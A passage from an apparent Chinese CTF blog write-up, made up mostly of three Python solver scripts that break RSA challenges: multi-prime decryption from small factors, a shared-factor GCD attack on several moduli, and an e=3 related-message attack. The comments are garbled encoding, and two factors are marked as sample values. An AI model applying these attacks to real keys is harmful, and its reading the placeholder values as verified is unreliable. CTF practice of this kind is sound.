<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== ç”¨æˆ·è¾“å…¥å‚æ•° ====================</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">810544624661213367964996895060815354972889892659483948276203088055391907479553</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">670610235999012099846283721569059674725712804950807955010725968103642359765806</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># åˆ†è§£åçš„5ä¸ªç´ æ•°ï¼ˆéœ€è‡ªè¡ŒéªŒè¯åˆ†è§£æ­£ç¡®æ€§ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">factors</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="mi">113</span><span class="p">,</span>        <span class="c1"># p1</span>
</span></span><span class="line"><span class="cl">    <span class="mi">18251</span><span class="p">,</span>        <span class="c1"># p2</span>
</span></span><span class="line"><span class="cl">    <span class="mi">2001511</span><span class="p">,</span>           <span class="c1"># p3</span>
</span></span><span class="line"><span class="cl">    <span class="mi">214168842768662180574654641</span><span class="p">,</span>                 <span class="c1"># p4 (ç¤ºä¾‹å€¼ï¼Œéœ€æ›¿æ¢å®é™…åˆ†è§£ç»“æœ)</span>
</span></span><span class="line"><span class="cl">    <span class="mi">916848439436544911290378588839845528581</span>                 <span class="c1"># p5 (ç¤ºä¾‹å€¼ï¼Œéœ€æ›¿æ¢å®é™…åˆ†è§£ç»“æœ)</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== åˆ†è§£éªŒè¯ ====================</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">validate_factors</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">product</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">factors</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">is_prime</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s2"> ä¸æ˜¯ç´ æ•°&#34;</span>  <span class="c1"># ç½‘é¡µ6çš„ç´ æ•°éªŒè¯</span>
</span></span><span class="line"><span class="cl">        <span class="n">product</span> <span class="o">*=</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">product</span> <span class="o">==</span> <span class="n">n</span><span class="p">,</span> <span class="s2">&#34;åˆ†è§£ç»“æœä¹˜ç§¯ä¸ç­‰äºn&#34;</span>  <span class="c1"># ç½‘é¡µ3çš„æ ¸å¿ƒéªŒè¯</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">validate_factors</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== è®¡ç®—ç§é’¥ ====================</span>
</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">factors</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">phi</span> <span class="o">*=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>  <span class="c1"># å¤šç´ æ•°RSAçš„æ¬§æ‹‰å‡½æ•°è®¡ç®—ï¼ˆç½‘é¡µ1åŸç†ï¼‰</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>  <span class="c1"># ç½‘é¡µ3çš„æ¨¡é€†å…ƒè®¡ç®—</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">ZeroDivisionError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;eä¸Ï†(n)ä¸äº’è´¨ï¼Œæ— æ³•ç”Ÿæˆç§é’¥&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== è§£å¯†è¿‡ç¨‹ ====================</span>
</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== ç»“æœå¤„ç† ====================</span>
</span></span><span class="line"><span class="cl"><span class="n">m_bytes</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å®‰å…¨è§£ç ç­–ç•¥ï¼ˆç½‘é¡µ5çš„é”™è¯¯å¤„ç†æ”¹è¿›ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;æ–‡æœ¬æ˜æ–‡:&#34;</span><span class="p">,</span> <span class="n">m_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">UnicodeDecodeError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å¤„ç†äºŒè¿›åˆ¶æ•°æ®ï¼ˆç½‘é¡µ2çš„å»ºè®®ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;æ£€æµ‹åˆ°éæ–‡æœ¬æ•°æ®ï¼Œ16è¿›åˆ¶è¾“å‡º:&#34;</span><span class="p">,</span> <span class="n">m_bytes</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;decrypted_data.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">m_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;äºŒè¿›åˆ¶æ–‡ä»¶å·²ä¿å­˜ä¸º decrypted_data.bin&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="mmä¸èº²çŒ«çŒ«"><strong>mmä¸èº²çŒ«çŒ«</strong>
</h3><p>å°†æ•°æ®æ”¾åœ¨1.txtï¼Œç„¶åæå–è§£å¯†å°±è¡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¯»å–æ•°æ®</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;1.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>  <span class="c1"># ä½¿ç”¨ utf-8 ç¼–ç </span>
</span></span><span class="line"><span class="cl">        <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">UnicodeDecodeError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;æ— æ³•ç”¨ utf-8 ç¼–ç è¯»å–æ–‡ä»¶ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶å†…å®¹æˆ–å°è¯•å…¶ä»–ç¼–ç ã€‚&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;n = &#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;c = &#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; = &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">key</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">value</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ns</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="n">cs</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ns</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">cs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å¯»æ‰¾å…±åŒçš„è´¨å› æ•°</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ns</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">ns</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">n1</span> <span class="o">=</span> <span class="n">ns</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">n2</span> <span class="o">=</span> <span class="n">ns</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">gcd</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">gcd</span><span class="p">(</span><span class="n">n1</span><span class="p">,</span> <span class="n">n2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">gcd</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Found common factor </span><span class="si">{</span><span class="n">gcd</span><span class="si">}</span><span class="s2"> between n[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">] and n[</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">]&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># åˆ†è§£ n1 å’Œ n2</span>
</span></span><span class="line"><span class="cl">            <span class="n">p1</span> <span class="o">=</span> <span class="n">gcd</span>
</span></span><span class="line"><span class="cl">            <span class="n">q1</span> <span class="o">=</span> <span class="n">n1</span> <span class="o">//</span> <span class="n">p1</span>
</span></span><span class="line"><span class="cl">            <span class="n">p2</span> <span class="o">=</span> <span class="n">gcd</span>
</span></span><span class="line"><span class="cl">            <span class="n">q2</span> <span class="o">=</span> <span class="n">n2</span> <span class="o">//</span> <span class="n">p2</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># è®¡ç®—ç§é’¥ d</span>
</span></span><span class="line"><span class="cl">            <span class="n">phi1</span> <span class="o">=</span> <span class="p">(</span><span class="n">p1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">phi2</span> <span class="o">=</span> <span class="p">(</span><span class="n">p2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
</span></span><span class="line"><span class="cl">            <span class="n">d1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">phi1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">d2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">phi2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># è§£å¯† c</span>
</span></span><span class="line"><span class="cl">            <span class="n">m1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">cs</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">d1</span><span class="p">,</span> <span class="n">n1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">m2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">cs</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">d2</span><span class="p">,</span> <span class="n">n2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Decrypted m1: </span><span class="si">{</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m1</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Decrypted m2: </span><span class="si">{</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m2</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="trwsians"><strong>tRwSiAns</strong>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">isqrt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å·²çŸ¥å‚æ•°</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">c1</span> <span class="o">=</span> <span class="mi">41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366</span>
</span></span><span class="line"><span class="cl"><span class="n">c2</span> <span class="o">=</span> <span class="mi">41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®—å“ˆå¸Œå€¼</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">md5_hash</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®—å“ˆå¸Œå€¼</span>
</span></span><span class="line"><span class="cl"><span class="n">h1</span> <span class="o">=</span> <span class="n">md5_hash</span><span class="p">(</span><span class="mi">307</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">h2</span> <span class="o">=</span> <span class="n">md5_hash</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®—å·®å€¼</span>
</span></span><span class="line"><span class="cl"><span class="n">delta_h</span> <span class="o">=</span> <span class="n">h1</span> <span class="o">-</span> <span class="n">h2</span>
</span></span><span class="line"><span class="cl"><span class="n">delta_c</span> <span class="o">=</span> <span class="n">c1</span> <span class="o">-</span> <span class="n">c2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ„é€ æ–¹ç¨‹</span>
</span></span><span class="line"><span class="cl"><span class="c1"># delta_c = (m + h1)^3 - (m + h2)^3 = 3*m^2*(h1 - h2) + 3*m*(h1^2 - h2^2) + (h1^3 - h2^3)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç®€åŒ–ä¸ºï¼šdelta_c = 3*m^2*delta_h + 3*m*(h1^2 - h2^2) + (h1^3 - h2^3)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># è¿›ä¸€æ­¥ç®€åŒ–ä¸ºï¼šdelta_c = 3*delta_h*m^2 + 3*(h1^2 - h2^2)*m + (h1^3 - h2^3)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># é™¤ä»¥ delta_h</span>
</span></span><span class="line"><span class="cl"><span class="n">S</span> <span class="o">=</span> <span class="n">delta_c</span> <span class="o">//</span> <span class="n">delta_h</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ„é€ äºŒæ¬¡æ–¹ç¨‹ï¼š3*m^2 + 3*(h1 + h2)*m + (h1^2 + h1*h2 + h2^2) - S = 0</span>
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="mi">3</span> <span class="o">*</span> <span class="p">(</span><span class="n">h1</span> <span class="o">+</span> <span class="n">h2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="n">h1</span><span class="o">**</span><span class="mi">2</span> <span class="o">+</span> <span class="n">h1</span><span class="o">*</span><span class="n">h2</span> <span class="o">+</span> <span class="n">h2</span><span class="o">**</span><span class="mi">2</span> <span class="o">-</span> <span class="n">S</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®—åˆ¤åˆ«å¼</span>
</span></span><span class="line"><span class="cl"><span class="n">delta</span> <span class="o">=</span> <span class="n">b</span><span class="o">**</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">4</span><span class="o">*</span><span class="n">a</span><span class="o">*</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="n">sqrt_delta</span> <span class="o">=</span> <span class="n">isqrt</span><span class="p">(</span><span class="n">delta</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ£€æŸ¥æ˜¯å¦ä¸ºå®Œå…¨å¹³æ–¹</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">sqrt_delta</span> <span class="o">*</span> <span class="n">sqrt_delta</span> <span class="o">!=</span> <span class="n">delta</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;åˆ¤åˆ«å¼ä¸æ˜¯å®Œå…¨å¹³æ–¹ï¼Œæ— æ³•æ±‚è§£ã€‚&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ±‚è§£æ–¹ç¨‹</span>
</span></span><span class="line"><span class="cl"><span class="n">m1</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="n">b</span> <span class="o">+</span> <span class="n">sqrt_delta</span><span class="p">)</span> <span class="o">//</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">m2</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="n">b</span> <span class="o">-</span> <span class="n">sqrt_delta</span><span class="p">)</span> <span class="o">//</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å°è¯•è§£ç </span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="p">[</span><span class="n">m1</span><span class="p">,</span> <span class="n">m2</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">all</span><span class="p">(</span><span class="mi">32</span> <span class="o">&lt;=</span> <span class="n">byte</span> <span class="o">&lt;=</span> <span class="mi">126</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">):</span>  <span class="c1"># æ£€æŸ¥æ˜¯å¦ä¸ºå¯æ‰“å°å­—ç¬¦</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;è§£å¯†æˆåŠŸï¼ŒFLAG ä¸ºï¼š&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/emo/">Emo</a>
        
    </section>


    
    <section class="article-copyright">
